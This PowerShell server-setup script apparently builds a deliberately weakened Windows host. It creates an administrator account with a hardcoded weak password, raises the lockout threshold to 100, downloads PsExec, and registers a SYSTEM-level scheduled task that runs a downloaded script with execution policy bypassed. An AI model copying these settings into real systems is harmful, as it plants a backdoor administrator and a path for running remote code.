# Optimize script performance
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"

# Setup directories
New-Item -Path 'C:\' -Name 'Scripts' -ItemType Directory -ErrorAction SilentlyContinue -Force

# Configure server defaults
Get-ScheduledTask -TaskName ServerManager | Disable-ScheduledTask -Verbose
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideClock" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "DisableNotificationCenter" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAVolume" -Value 1

# Create a local administrator account
$Password = "Password51"
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
New-LocalUser -FullName HelpdeskAdmin -Name HelpdeskAdmin -Password $SecurePassword -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member HelpdeskAdmin

# Set the account invalid logoon attemps lockout threshold to 100
net accounts /lockoutthreshold:100

# Download PSExec
Invoke-WebRequest -Uri 'https://live.sysinternals.com/PsExec64.exe' -OutFile 'C:\Scripts\PsExec64.exe'

# Set Scheduled Task
Invoke-WebRequest -Uri '' -OutFile 'C:\Scripts\Unprotect-User.ps1'
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Scripts\Unprotect-User.ps1"
Register-ScheduledTask -TaskName "Unprotect-User" -Action $Action -Description "Unprotect User" -RunLevel Highest -User "System"